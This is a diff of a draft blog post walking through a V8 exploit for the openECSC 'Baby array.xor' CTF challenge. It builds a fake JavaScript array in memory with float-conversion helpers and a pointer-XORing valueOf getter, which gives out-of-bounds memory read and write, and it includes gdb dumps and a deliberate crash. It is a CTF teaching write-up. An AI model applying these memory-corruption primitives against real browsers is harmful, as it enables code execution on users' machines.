@@ -7,6 +7,8 @@ slug = "exploiting-v8-at-openecsc"
 summary = "todo: fill this and also the date"
 +++
 
+**(DRAFT)**
+
 Despite having 7 Chrome CVEs, I've never actually exploited a memory corruption in it's [V8 JavaScript engine](https://v8.dev/) before. [Baby array.xor](https://github.com/ECSC2024/openECSC-2024)<!-- TODO: link -->, a challenge at this year's openECSC CTF, was my first time going from a V8 bug to popping a `/bin/sh` shell.
 
 Most V8 exploits tend to have two sides to them - figuring out a unique way to trigger some sort of a memory corruption of at least one byte, and then following a common pattern of building upon that corruption to read arbitrary addresses (`addrof`), create fake objects (`fakeobj`), and eventually reach arbitrary code execution. This challenge was no different.
@@ -160,7 +162,7 @@ The patch adds a new **Array.xor()** prototype that can be used to xor all value
 .jsConsole {
 	background: #282828;
 	border-radius: 4px;
-	width: 100%;
+	width: calc(100% - 2px);
 	color: #E3E3E3;
 	font-family: Menlo, Consolas, "Ubuntu Mono", monospace;
 	font-size: 12px;
@@ -485,14 +487,12 @@ You'll notice I subtracted 1 from the memory address before viewing it - that's 
 
 But let's try to understand what the gdb output above means:
 
-
-
 <div class="jsMem">
 	<div class="jsMemTitle">V8<div class="jsMemSep"></div></div>
 	<div class="jsMemDbg">DebugPrint: <span class="jsMemVar10">0xa3800042be9</span>: [JSArray]
 - map: <span class="jsMemVar7">0x0a38001cb7c5</span> &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x0a38001cb11d &lt;JSArray[0]&gt;
-- elements: 0x0a3800042bc9 &lt;<span class="jsMemVar2">FixedDoubleArray</span>[<span class="jsMemVar1">3</span>]&gt; [PACKED_DOUBLE_ELEMENTS]
+- elements: <span class="jsMemVar9">0x0a3800042bc9</span> &lt;<span class="jsMemVar2">FixedDoubleArray</span>[<span class="jsMemVar1">3</span>]&gt; [PACKED_DOUBLE_ELEMENTS]
 - length: <span class="jsMemVar8">3</span>
 - properties: <span class="jsMemVar6">0x0a3800000725</span> &lt;FixedArray[0]&gt;
 - All own properties (excluding elements): {
@@ -518,7 +518,415 @@ The array is at <span class="jsMemVar10">0xa3800042be8</span>, its <span class="
 
 Try <span class="fineText">hovering over</span><span class="coarseText">tapping on</span> the text and stuff above. You'll see what the memory values mean and how they're represented in the %DebugPrint output.
 
-You may be wondering why the memory only contains half the address - `0xa3800042bc8` is stored as `0x00042bc9` for example. This is [V8's pointer compression](https://v8.dev/blog/pointer-compression) and it makes pointers only store the lower 32 bits of an address.
+You may be wondering why the memory only contains half the address - `0xa3800042bc8` is stored as `0x00042bc9` for example. This is [V8's pointer compression](https://v8.dev/blog/pointer-compression) and for our purposes all it does is make pointers be just the lower 32 bits of an address.
+
+Pretty cool, let's see what happens if we put an array inside of another array:
+
+<!-- arr = [1.1, 2.2, 3.3]; arr2 = [arr] -->
+<div class="jsConsole" style="margin-bottom: 4px;">
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr2</span> = [<span class="jsConVar">arr</span>]</div>
+</div>
+<div class="jsMem">
+	<div class="jsMemTitle">V8<div class="jsMemSep"></div></div>
+	<div class="jsMemDbg">DebugPrint: 0xa3800044a31: [JSArray]
+ - map: 0x0a38001cb845 &lt;Map[16](PACKED_ELEMENTS)&gt; [FastProperties]
+ - prototype: 0x0a38001cb11d &lt;JSArray[0]&gt;
+ - elements: 0x0a3800044a25 &lt;FixedArray[1]&gt; [PACKED_ELEMENTS]
+ - length: 1
+ - properties: 0x0a3800000725 &lt;FixedArray[0]&gt;
+ - All own properties (excluding elements): {
+    0xa3800000d99: [String] in ReadOnlySpace: #length: 0x0a3800025f85 &lt;AccessorInfo name= 0x0a3800000d99 &lt;String[6]: #length&gt;, data= 0x0a3800000069 &lt;undefined&gt;&gt; (const accessor descriptor, attrs: [W__]), location: descriptor
+ }
+ - elements: 0x0a3800044a25 &lt;FixedArray[1]&gt; {
+           0: 0x0a3800042be9 &lt;JSArray[3]&gt;
+ }</div>
+<div class="jsMemTitle">GDB<div class="jsMemSep"></div></div>
+	<div class="jsMemHex">0xa3800044a10: 0x000005e5000449f5 0x1d1a6d7400000004
+0xa3800044a20: 0x0000056d001d3fb7 0x00042be900000002
+0xa3800044a30: 0x00000725001cb845 0x0000000200044a25
+0xa3800044a40: 0x00000725001cb845 0x0000000200044b99</div>
+<div class="jsMemTitle">ENG<div class="jsMemSep"></div></div>
+<div class="jsMemLegend">
+	The PACKED_ELEMENTS array is at 0xa3800044a30, its 1 element is at 0xa3800044a24 in a FixedArray[1] and the element is a pointer to the previous array at 0xa3800042be8.
+</div>
+</div>
+
+The memory order of the elements part here looks a little odd because it doesn't align with the 64-bit words. Instead of reading 64-bit values as `0x1111222233334444`, you have to read them as `0x3333444400000000 0x0000000011112222`.
+
+The array in our array is just stored as a pointer to that array! At the moment it is pointing at `0xa3800042be8` with our double array, but if we XOR this pointer to a different address we can make it point to any array or object we want... even if it doesn't "actually" exist!
+
+Let's try to make a new array appear out of thin air. To do that, we have to put something in the memory that *looks* like an array, and then use XOR to point a pointer to it. I'm going to reuse the header of our first array at `0xa3800042be8`, changing the memory addresses to match with our new fake array.
+
+<div class="jsMem">
+<div class="jsMemTitle">GDB<div class="jsMemSep"></div></div>
+	<div class="jsMemHex"><span class="over430">0x??????????: 0x????????????????</span><span class="under430"><br>0x??????????:</span> 0x<span class="jsMemVar1">00000100</span><span class="jsMemVar2">000008a9</span></span>
+0x??????????: 0x<span class="jsMemVar6">00000725</span><span class="jsMemVar7">001cb7c5</span><span class="under430"><br>0x??????????:</span> 0x<span class="jsMemVar8">00000100</span><span class="jsMemVar9">00042bd1</span>
+</div>
+<div class="jsMemTitle">ENG<div class="jsMemSep"></div></div>
+<div class="jsMemLegend">
+Fake <code><span class="jsMemVar7">PACKED_DOUBLE_ELEMENTS</span></code> array with an <span class="jsMemVar6">empty properties list</span>, with <span class="jsMemVar8">128 elements</span> at <span class="jsMemVar9" style="text-wrap: nowrap">0x???00042bd0</span>. At that address we will have a <span class="jsMemVar2">FixedDoubleArray</span> with a <span class="jsMemVar1">length of 128</span>.
+</div>
+</div>
+
+That looks like a pretty good fake! And the length of 128 elements is a bonus - letting us read and write far more than we should be able to. To put this fake array in the memory, we must first convert it into floats so we can use it within an array. There are many ways to do that, but the easiest method within JavaScript is to share the same **ArrayBuffer** between a **Float64Array** and a **BigUint64Array**.
+
+```js
+> buffer = new ArrayBuffer(8);
+> floatBuffer = new Float64Array(buffer);
+> int64Buffer = new BigUint64Array(buffer);
+> i2f = (i) => {
+  int64Buffer[0] = i;
+  return floatBuffer[0];
+}
+> i2f(0x00000725001cb7c5n)
+< 3.881131231533e-311
+```
+
+Pretty easy! You'll notice I appended an `n` to our hex value - this is just to convert it to a [BigInt](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/BigInt), which is required for the **BigUint64Array** but also gives us more accuracy.
+
+Let's put these values in the array from earlier:
+
+```js
+> arr[0] = i2f(0x00000100000008a9n)
+> arr[1] = i2f(0x00000725001cb7c5n)
+> arr[2] = i2f(0x0000010000042bd1n)
+> arr
+< [5.432309235825e-312, 3.881131231533e-311, 5.432310575454e-312]
+```
+
+So our original real array starts at `0xa3800042be8`, and we have our cool new fake array in the memory at `0xa3800042bd8`, so what we can do now is put our *real array* in an array with the evil getter trick, and then XOR the pointer it to make it point to the fake array.
+
+```js
+> arr3 = [1.1]
+> evil = {
+     valueOf: () => {
+       arr3[0] = arr;
+       const realArray = 0xa3800042be8n;
+       const fakeArray = 0xa3800042bd8n;
+       return Number(realArray ^ fakeArray);
+     }
+   }
+> arr3.xor(evil)
+> arr3[0]
+< [3.881131231533e-311, 5.432310575454e-312, 3.881131231533e-311, 1.27321098e-313, 3.8055412126965747e-305, 3.3267913058887005e+257, 2.0317942745751732e-110, 1.2799112976201688e-152, 7.632660997817179e-24, 4.48268017468496e+217, 2.502521315148532e+262, ... (123 more)]
+```
+
+Wow! That fake array of ours has a lot of data that we didn't put there. Let's see what it looks like in the memory.
+
+<div class="jsMem">
+	<div class="jsMemTitle">V8<div class="jsMemSep"></div></div>
+	<div class="jsMemDbg">DebugPrint: <span class="jsMemVar0">0x25ec00042bd9</span>: [JSArray]
+ - map: 0x25ec001cb7c5 &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]
+ - prototype: 0x25ec001cb11d &lt;JSArray[0]&gt;
+ - elements: <span class="jsMemVar8">0x25ec00042bd1</span> &lt;FixedDoubleArray[128]&gt; [PACKED_DOUBLE_ELEMENTS]
+ - length: <span class="jsMemVar7">128</span>
+ - properties: 0x25ec00000725 &lt;FixedArray[0]&gt;
+ - All own properties (excluding elements): {
+    0x25ec00000d99: [String] in ReadOnlySpace: #length: 0x25ec00025f85 &lt;AccessorInfo name= 0x25ec00000d99 &lt;String[6]: #length&gt;, data= 0x25ec00000069 &lt;undefined&gt;&gt; (const accessor descriptor, attrs: [W__]), location: descriptor
+ }
+ - elements: <span class="jsMemVar8">0x25ec00042bd1</span> &lt;FixedDoubleArray[128]&gt; {
+           0: <span class="jsMemVar10 jsMemVar6">3.88113e-311</span>
+           1: <span class="jsMemVar7 jsMemVar8">5.43231e-312</span>
+           2: <span class="jsMemVar2">3.88113e-311</span>
+           3: <span class="jsMemVar3">1.27321e-313</span>
+           4: <span class="jsMemVar4">3.80554e-305</span>
+           5: <span class="jsMemVar5">3.32679e+257</span>
+           6: <span class="jsMemVar11">2.03179e-110</span>
+           7: <span class="jsMemVar12">1.27991e-152</span>
+           8: <span class="jsMemVar13">7.63266e-24</span>
+           9: <span class="jsMemVar14">4.48268e+217</span>
+          10: <span class="jsMemVar15">2.50252e+262</span>
+          11: <span class="jsMemVar16">8.76426e+252</span>
+          12: <span class="jsMemVar17">3.03108e-152</span>
+          13: <span class="jsMemVar18">5.32817e+233</span>
+          14: <span class="jsMemVar19">5.52e+228</span>
+          15: <span class="jsMemVar20">7.49511e+247</span>
+          ...
+}</div>
+<div class="jsMemTitle">GDB<div class="jsMemSep"></div></div>
+	<div class="jsMemHex">0x25ec00042bb8: 0x00000004000005e5 0x001d3377020801a4
+<span class="jsMemVar8">0x25ec00042bc8</span>: 0x00000006000008a9 0x<span class="jsMemVar9">00000100</span><span class="jsMemVar1">000008a9</span>
+<span class="jsMemVar0">0x25ec00042bd8</span>: 0x<span class="jsMemVar10">00000725</span><span class="jsMemVar6">001cb7c5</span> 0x<span class="jsMemVar7">00000100</span><span class="jsMemVar8">00042bd1</span>
+0x25ec00042be8: 0x<span class="jsMemVar2">00000725001cb7c5</span> 0x<span class="jsMemVar3">0000000600042bc9</span>
+0x25ec00042bf8: 0x<span class="jsMemVar4">00bab9320000010d</span> 0x<span class="jsMemVar5">7566280a00000adc</span>
+0x25ec00042c08: 0x<span class="jsMemVar11">29286e6f6974636e</span> 0x<span class="jsMemVar12">20657375220a7b20</span>
+0x25ec00042c18: 0x<span class="jsMemVar13">3b22746369727473</span> 0x<span class="jsMemVar14">6d2041202f2f0a0a</span>
+0x25ec00042c28: 0x<span class="jsMemVar15">76696e752065726f</span> 0x<span class="jsMemVar16">7473206c61737265</span>
+0x25ec00042c38: 0x<span class="jsMemVar17">20796669676e6972</span> 0x<span class="jsMemVar18">7075732074616874</span>
+0x25ec00042c48: 0x<span class="jsMemVar19">6f6d207374726f70</span> 0x<span class="jsMemVar20">7365707974206572</span></div>
+<div class="jsMemTitle">ENG<div class="jsMemSep"></div></div>
+<div class="jsMemLegend">
+</div>
+</div>
+
+That's so cool!! It really is just picking up the next 1024 bytes of memory as floats and we can see it all by just looking at the array. In fact, we can even see our original `arr` array's header, let's try to read it out from within JavaScript. We'll want a function to turn floats back into hex, for that we can just create the reverse of the `i2f` function from earlier.
+
+```js
+> f2i = (f) => {
+  floatBuffer[0] = f;
+  return int64Buffer[0];
+}
+> arr3[0][2]
+< 3.881131231533e-311
+> f2i(arr3[0][2])
+< 7855497066437n
+> f2i(arr3[0][2]).toString(16)
+< "725001cb7c5" // 0x00000725001cb7c5
+```
+
+Exciting! Let's overwrite `arr`'s header with some random stuff and see what happens.
+
+```js
+> arr
+< [5.432309235825e-312, 3.881131231533e-311, 5.432310575454e-312]
+> arr3[0][2] = i2f(0x1337133713371337n)
+> arr
+Received signal 11 SEGV_ACCERR 25ec1337133e
+==== C stack trace ===============================
+
+ [0x555557b9ea23]
+ [0x555557b9e972]
+ [0x7ffff7cdae20]
+ [0x555556d3190b]
+ [0x555557a12ff6]
+[end of stack trace]
+Segmentation fault (core dumped)
+```
+
+Whoops, yeah... there's the rub. The memory we're playing with is rather fragile and randomly changing stuff around is going to end up with a crash. We'll have to be pretty careful going forward if we want to end up with anything more than a segmentation fault. And there's more to worry about later down the line because v8 also has a garbage collector that likes to swoop in every once in a while and rearrange the memory.
+
+This is a good time to figure out a plan for getting our primitives cooked up though.
+
+<!--
+DebugPrint: 0x25ec00042be9: [JSArray]
+ - map: 0x25ec001cb7c5 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
+ - prototype: 0x25ec001cb11d <JSArray[0]>
+ - elements: 0x25ec00042bc9 <FixedDoubleArray[3]> [PACKED_DOUBLE_ELEMENTS]
+ - length: 3
+ - properties: 0x25ec00000725 <FixedArray[0]>
+ - All own properties (excluding elements): {
+    0x25ec00000d99: [String] in ReadOnlySpace: #length: 0x25ec00025f85 <AccessorInfo name= 0x25ec00000d99 <String[6]: #length>, data= 0x25ec00000069 <undefined>> (const accessor descriptor, attrs: [W__]), location: descriptor
+ }
+ - elements: 0x25ec00042bc9 <FixedDoubleArray[3]> {
+           0: 5.43231e-312
+           1: 3.88113e-311
+           2: 5.43231e-312
+ }
+0x25ec00042ba8:	0x0000006900000069	0x0000006900000069
+0x25ec00042bb8:	0x00000004000005e5	0x001d3377020801a4
+0x25ec00042bc8:	0x00000006000008a9	0x00000100000008a9
+0x25ec00042bd8:	0x00000725001cb7c5	0x0000010000042bd1
+0x25ec00042be8:	0x00000725001cb7c5	0x0000000600042bc9
+0x25ec00042bf8:	0x00bab9320000010d	0x7566280a00000adc
+0x25ec00042c08:	0x29286e6f6974636e	0x20657375220a7b20
+
+DebugPrint: 0x25ec00042bd9: [JSArray]
+ - map: 0x25ec001cb7c5 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
+ - prototype: 0x25ec001cb11d <JSArray[0]>
+ - elements: 0x25ec00042bd1 <FixedDoubleArray[128]> [PACKED_DOUBLE_ELEMENTS]
+ - length: 128
+ - properties: 0x25ec00000725 <FixedArray[0]>
+ - All own properties (excluding elements): {
+    0x25ec00000d99: [String] in ReadOnlySpace: #length: 0x25ec00025f85 <AccessorInfo name= 0x25ec00000d99 <String[6]: #length>, data= 0x25ec00000069 <undefined>> (const accessor descriptor, attrs: [W__]), location: descriptor
+ }
+ - elements: 0x25ec00042bd1 <FixedDoubleArray[128]> {
+           0: 3.88113e-311
+           1: 5.43231e-312
+           2: 3.88113e-311
+           3: 1.27321e-313
+           4: 3.80554e-305
+           5: 3.32679e+257
+           6: 2.03179e-110
+           7: 1.27991e-152
+           8: 7.63266e-24
+           9: 4.48268e+217
+          10: 2.50252e+262
+          11: 8.76426e+252
+          12: 3.03108e-152
+          13: 5.32817e+233
+          14: 5.52e+228
+          15: 7.49511e+247
+          16: 1.70307e+93
+          17: 1.13277e+102
+          18: 2.35901e+251
+          19: 1.39617e+195
+          20: 1.94673e+227
+          21: 4.70108e+180
+          22: 4.0255e+260
+          23: 7.35876e+223
+          24: 7.51282e+252
+          25: 2.92295e-14
+          26: 1.16291e-153
+          27: 5.03276e+175
+          28: 7.34746e+223
+          29: 1.53297e+171
+          30: 3.42134e+180
+          31: 1.1629e-153
+          32: 7.2497e+228
+          33: 2.35288e+251
+          34: 1.88754e+219
+          35: 1.67495e+243
+          36: 1.28185e+160
+          37: 3.9935e+252
+          38: 1.47192e+224
+          39: 2.19993e-152
+          40: 4.45197e+252
+          41: 4.38777e+242
+          42: 1.20165e+285
+          43: 1.81668e-152
+          44: 3.85487e-22
+          45: 4.82407e+228
+          46: 1.32904e+272
+          47: 2.04733e+190
+          48: 1.35361e+277
+          49: 3.48325e+183
+          50: 1.81597e-152
+          51: 2.116e+36
+          52: 3.6817e+180
+          53: 6.77826e-109
+          54: 9.32195e+250
+          55: 2.41074e+198
+          56: 2.92646e-14
+          57: 4.82407e+228
+          58: 3.42134e+180
+          59: 7.71012e+241
+          60: 2.3557e+44
+          61: 1.35361e+277
+          62: 5.42578e-109
+          63: 1.70299e+93
+          64: 4.8753e+252
+          65: 2.92294e-14
+          66: 4.82407e+228
+          67: 1.32906e+272
+          68: 6.01335e-154
+          69: 1.06758e+224
+          70: 1.32904e+272
+          71: 2.04733e+190
+          72: 1.35361e+277
+          73: 1.17835e+49
+          74: 7.60998e+179
+          75: 1.14281e+243
+          76: 4.45197e+252
+          77: 1.72341e+243
+          78: 2.44012e-154
+          79: 6.12501e+257
+          80: 4.35431e+242
+          81: 4.29763e+160
+          82: 1.72387e+243
+          83: 2.20813e-259
+          84: 4.95173e-114
+          85: 2.66582e-260
+          86: 4.82407e+228
+          87: 1.69376e+190
+          88: 2.00012e+174
+          89: 3.52845e-258
+          90: 2.61377e+180
+          91: 2.18076e-153
+          92: 3.94356e+180
+          93: 1.99416e+174
+          94: 3.54813e+246
+          95: 6.20757e+276
+          96: 1.1163e+219
+          97: 1.42237e+214
+          98: 2.98362e+174
+          99: 1.03877e-13
+         100: 6.01347e-154
+         101: 2.63177e-144
+         102: 5.98158e-154
+         103: 4.38777e+242
+         104: 9.38333e-154
+         105: 4.70075e+180
+         106: 2.16841e+243
+         107: 4.39401e+242
+         108: 2.00012e+174
+         109: 2.44551e-154
+         110: 1.12185e+200
+         111: 6.32278e+233
+         112: 1.20166e+285
+         113: 6.0785e+247
+         114: 1.81796e+185
+         115: 2.44513e-154
+         116: 4.91347e+252
+         117: 6.02646e+175
+         118: 7.60682e-24
+         119: 6.0785e+247
+         120: 3.68727e+180
+         121: 6.01335e-154
+         122: 3.27614e+222
+         123: 2.12471e-259
+         124: 5.02621e+180
+         125: 9.75395e+199
+         126: 6.01335e-154
+         127: 3.96061e+246
+ }
+
+ [3.881131231533e-311, 5.432310575454e-312, 3.881131231533e-311, 1.27321098e-313, 3.8055412126965747e-305, 3.3267913058887005e+257, 2.0317942745751732e-110, 1.2799112976201688e-152, 7.632660997817179e-24, 4.48268017468496e+217, 2.502521315148532e+262, 8.764262388001722e+252, 3.031075143147101e-152, 5.328171041616219e+233, 5.5199981093443586e+228, 7.495112028514905e+247, 1.7030718657907086e+93, 1.1327727072654574e+102, 2.359008502145169e+251, 1.3961696417690724e+195, 1.946731766214472e+227, 4.701083965992104e+180, 4.0255010912767526e+260, 7.358764607712314e+223, 7.512821250369065e+252, 2.922947873833435e-14, 1.1629076175361261e-153, 5.032758170002575e+175, 7.347463834617257e+223, 1.5329662439803979e+171, 3.4213414803413857e+180, 1.1628950505465645e-153, 7.249703341733572e+228, 2.3528846409008256e+251, 1.887541324937428e+219, 1.6749482924901434e+243, 1.2818510664374012e+160, 3.9934961143490695e+252, 1.471916185778813e+224, 2.199930330528265e-152, 4.451970048608952e+252, 4.387772969439078e+242, 1.2016473886678996e+285, 1.8166790500083872e-152, 3.854866532902535e-22, 4.824071356773969e+228, 1.3290427309660736e+272, 2.047327829350588e+190, 1.3536126781574966e+277, 3.483253154033512e+183, 1.8159689052330482e-152, 2.1160022451239437e+36, 3.681697791653666e+180, 6.778259720903815e-109, 9.321952567029354e+250, 2.4107445326902345e+198, 2.926457999915565e-14, 4.8240713567684684e+228, 3.4213415341957124e+180, 7.710117380014104e+241, 2.3557041276058587e+44, 1.3536125730510832e+277, 5.425776175576578e-109, 1.7029939446540271e+93, 4.875303082203223e+252, 2.9229369686598505e-14, 4.8240713567684684e+228, 1.3290632567981842e+272, 6.013345103256257e-154, 1.0675799966104346e+224, 1.329042730966254e+272, 2.047327829350588e+190, 1.3536126781574966e+277, 1.1783471031520647e+49, 7.60998266456383e+179, 1.1428127210548877e+243, 4.451969612788515e+252, 1.7234133790274087e+243, 2.4401170345112163e-154, 6.125014536925279e+257, 4.35430680709565e+242, 4.297634921646545e+160, 1.7238679602485346e+243, 2.2081347145256313e-259, 4.951726458333133e-114, 2.665824230613437e-260, 4.824071356773969e+228, 1.6937561043854245e+190, 2.000124904243212e+174, 3.5284469478036997e-258, 2.6137726451616463e+180, 2.1807602048433366e-153, 3.943559380635086e+180, 1.99416198144094e+174, 3.54813185627259e+246, 6.20756822256293e+276, 1.116300455916987e+219, 1.4223736646917546e+214, 2.983616214742915e+174, 1.0387699858413993e-13, 6.013469528779009e-154, 2.6317676997293626e-144, 5.98157614192997e-154, 4.387773091775321e+242, 9.383334639275019e-154, 4.700750235134098e+180, 2.168407739600616e+243, 4.394013183574196e+242, 2.0001249042452393e+174, 2.44550607409185e-154, 1.1218494899515307e+200, 6.3227820238179025e+233, 1.201657563419933e+285, 6.078498613491043e+247, 1.817963013331523e+185, 2.4451319167857815e-154, 4.913474262940492e+252, 6.026462847655484e+175, 7.606824347836941e-24, 6.078498613491043e+247, 3.6872716361531476e+180, 6.013345409343766e-154, 3.276135975506186e+222, 2.124706304589829e-259, 5.026209342472844e+180, 9.753946595358247e+199, 6.013345409343785e-154, 3.960605369357789e+246]
+
+ 0x25ec00042af8:	0x0000006900000069	0x000480a500000069
+0x25ec00042b08:	0x00000069001d5921	0x0000006900000069
+0x25ec00042b18:	0x000453fd00000069	0x00000069001d45b9
+0x25ec00042b28:	0x0000006900000069	0x0000006900000069
+0x25ec00042b38:	0x0000006900000069	0x001d432100044e0d
+0x25ec00042b48:	0x0000006900000069	0x0000006900000069
+0x25ec00042b58:	0x0000006900000069	0x0000006900000069
+0x25ec00042b68:	0x0000006900000069	0x001d516100046f99
+0x25ec00042b78:	0x0000006900000069	0x0000006900000069
+0x25ec00042b88:	0x0000006900000069	0x0000006900000069
+0x25ec00042b98:	0x0000006900000069	0x001d4ea500046ae1
+0x25ec00042ba8:	0x0000006900000069	0x0000006900000069
+0x25ec00042bb8:	0x00000004000005e5	0x001d3377020801a4
+0x25ec00042bc8:	0x00000006000008a9	0x00000100000008a9
+0x25ec00042bd8:	0x00000725001cb7c5	0x0000010000042bd1
+0x25ec00042be8:	0x00000725001cb7c5	0x0000000600042bc9
+0x25ec00042bf8:	0x00bab9320000010d	0x7566280a00000adc
+0x25ec00042c08:	0x29286e6f6974636e	0x20657375220a7b20
+0x25ec00042c18:	0x3b22746369727473	0x6d2041202f2f0a0a
+0x25ec00042c28:	0x76696e752065726f	0x7473206c61737265
+0x25ec00042c38:	0x20796669676e6972	0x7075732074616874
+0x25ec00042c48:	0x6f6d207374726f70	0x7365707974206572
+0x25ec00042c58:	0x534a206e61687420	0x55202f2f0a2e4e4f
+0x25ec00042c68:	0x7420796220646573	0x6873203864206568
+0x25ec00042c78:	0x6f206f74206c6c65	0x6572207475707475
+0x25ec00042c88:	0x760a2e73746c7573	0x6e69727473207261
+0x25ec00042c98:	0x7470654479666967	0x3d2074696d694c68
+0x25ec00042ca8:	0x202f2f20203b3420	0x64696f7661206f54
+0x25ec00042cb8:	0x6e69687361726320	0x637963206e6f2067
+0x25ec00042cc8:	0x656a626f2063696c	0x202f2f0a0a737463
+0x25ec00042cd8:	0x6f7320796b636148	0x74206e6f6974756c
+0x25ec00042ce8:	0x6d7563726963206f	0x726f6620746e6576
+0x25ec00042cf8:	0x612d2d20676e6963	0x74616e2d776f6c6c
+0x25ec00042d08:	0x6e79732d73657669	0x20726f6620786174
+0x25ec00042d18:	0x74636e75660a3864	0x72507369206e6f69
+0x25ec00042d28:	0x7b20296f2879786f	0x206e727574657220
+0x25ec00042d38:	0x3b7d2065736c6166	0x6f6974636e75660a
+0x25ec00042d48:	0x786f7250534a206e	0x6772615474654779
+0x25ec00042d58:	0x79786f7270287465	0x660a3b7d207b2029
+0x25ec00042d68:	0x206e6f6974636e75	0x4779786f7250534a
+0x25ec00042d78:	0x656c646e61487465	0x2979786f72702872
+0x25ec00042d88:	0x740a0a3b7d207b20	0x6920200a7b207972
+0x25ec00042d98:	0x3d2079786f725073	0x6f6974636e754620
+0x25ec00042da8:	0x656a626f275b286e	0x7227202c5d277463
+0x25ec00042db8:	0x4925206e72757465	0x79786f7250534a73
+0x25ec00042dc8:	0x297463656a626f28	0x534a20200a3b2927
+0x25ec00042dd8:	0x74654779786f7250	0x3d20746567726154
+0x25ec00042de8:	0x6f6974636e754620	0x786f7270275b286e
+0x25ec00042df8:	0x2020200a2c5d2779	0x6e72757465722720
+0x25ec00042e08:	0x786f7250534a2520	0x6772615474654779
+0x25ec00042e18:	0x79786f7270287465	0x4a20200a3b292729
+0x25ec00042e28:	0x654779786f725053	0x72656c646e614874
+0x25ec00042e38:	0x74636e7546203d20	0x7270275b286e6f69
+0x25ec00042e48:	0x200a2c5d2779786f	0x7574657227202020
+0x25ec00042e58:	0x7250534a25206e72	0x614874654779786f
+0x25ec00042e68:	0x72702872656c646e	0x0a3b29272979786f
+0x25ec00042e78:	0x286863746163207d	0x0a0a3b7d7b202965
+0x25ec00042e88:	0x6f6974636e75660a	0x676e69727453206e
+0x25ec00042e98:	0x64202c7828796669	0x0a7b202968747065
+0x25ec00042ea8:	0x6564282066692020	0x203d3d3d20687470
+0x25ec00042eb8:	0x656e696665646e75	0x64202020200a2964
+0x25ec00042ec8:	0x73203d2068747065	0x796669676e697274
+0x25ec00042ed8:	0x6d694c6874706544	0x6c6520200a3b7469
+0x25ec00042ee8:	0x6428206669206573	0x3d3d3d2068747065
+-->
 
 <style>
 .jsMem {
@@ -606,6 +1014,17 @@ You may be wondering why the memory only contains half the address - `0xa3800042
 	--jsMemVarB8:  #0000;
 	--jsMemVarB9:  #0000;
 	--jsMemVarB10:  #0000;
+	--jsMemVarB11:  #0000;
+	--jsMemVarB12:  #0000;
+	--jsMemVarB13:  #0000;
+	--jsMemVarB14:  #0000;
+	--jsMemVarB15:  #0000;
+	--jsMemVarB16:  #0000;
+	--jsMemVarB17:  #0000;
+	--jsMemVarB18:  #0000;
+	--jsMemVarB19:  #0000;
+	--jsMemVarB20:  #0000;
+	--jsMemVarB21:  #0000;
 	--jsMemVarF0:  #ff9999;
 	--jsMemVarF1:  #99ffc1;
 	--jsMemVarF2:  #99ffea;
@@ -617,6 +1036,17 @@ You may be wondering why the memory only contains half the address - `0xa3800042
 	--jsMemVarF8:  #c1ff99;
 	--jsMemVarF9:  #99ff99;
 	--jsMemVarF10:  #ffc199;
+	--jsMemVarF11:  #c199ff;
+	--jsMemVarF12:  #ea99ff;
+	--jsMemVarF13:  #ff99ea;
+	--jsMemVarF14:  #ff99c1;
+	--jsMemVarF15:  #ff9999;
+	--jsMemVarF16:  #ffc199;
+	--jsMemVarF17:  #ffea99;
+	--jsMemVarF18:  #eaff99;
+	--jsMemVarF19:  #c1ff99;
+	--jsMemVarF20:  #99ff99;
+	--jsMemVarF21:  #99ffc1;
 	--jsMemVarB: var(--lyreGold);
 	--jsMemVarF: #000;
 }
@@ -632,6 +1062,17 @@ You may be wondering why the memory only contains half the address - `0xa3800042
 .jsMemVar8 { color: var(--jsMemVarF8); background: var(--jsMemVarB8) }
 .jsMemVar9 { color: var(--jsMemVarF9); background: var(--jsMemVarB9) }
 .jsMemVar10 { color: var(--jsMemVarF10); background: var(--jsMemVarB10) }
+.jsMemVar11 { color: var(--jsMemVarF11); background: var(--jsMemVarB11) }
+.jsMemVar12 { color: var(--jsMemVarF12); background: var(--jsMemVarB12) }
+.jsMemVar13 { color: var(--jsMemVarF13); background: var(--jsMemVarB13) }
+.jsMemVar14 { color: var(--jsMemVarF14); background: var(--jsMemVarB14) }
+.jsMemVar15 { color: var(--jsMemVarF15); background: var(--jsMemVarB15) }
+.jsMemVar16 { color: var(--jsMemVarF16); background: var(--jsMemVarB16) }
+.jsMemVar17 { color: var(--jsMemVarF17); background: var(--jsMemVarB17) }
+.jsMemVar18 { color: var(--jsMemVarF18); background: var(--jsMemVarB18) }
+.jsMemVar19 { color: var(--jsMemVarF19); background: var(--jsMemVarB19) }
+.jsMemVar20 { color: var(--jsMemVarF20); background: var(--jsMemVarB20) }
+.jsMemVar21 { color: var(--jsMemVarF21); background: var(--jsMemVarB21) }
 .jsMem:has(.jsMemVar0:hover) { --jsMemVarB0: var(--jsMemVarB); --jsMemVarF0: var(--jsMemVarF) }
 .jsMem:has(.jsMemVar1:hover) { --jsMemVarB1: var(--jsMemVarB); --jsMemVarF1: var(--jsMemVarF) }
 .jsMem:has(.jsMemVar2:hover) { --jsMemVarB2: var(--jsMemVarB); --jsMemVarF2: var(--jsMemVarF) }
@@ -643,6 +1084,17 @@ You may be wondering why the memory only contains half the address - `0xa3800042
 .jsMem:has(.jsMemVar8:hover) { --jsMemVarB8: var(--jsMemVarB); --jsMemVarF8: var(--jsMemVarF) }
 .jsMem:has(.jsMemVar9:hover) { --jsMemVarB9: var(--jsMemVarB); --jsMemVarF9: var(--jsMemVarF) }
 .jsMem:has(.jsMemVar10:hover) { --jsMemVarB10: var(--jsMemVarB); --jsMemVarF10: var(--jsMemVarF) }
+.jsMem:has(.jsMemVar11:hover) { --jsMemVarB11: var(--jsMemVarB); --jsMemVarF11: var(--jsMemVarF) }
+.jsMem:has(.jsMemVar12:hover) { --jsMemVarB12: var(--jsMemVarB); --jsMemVarF12: var(--jsMemVarF) }
+.jsMem:has(.jsMemVar13:hover) { --jsMemVarB13: var(--jsMemVarB); --jsMemVarF13: var(--jsMemVarF) }
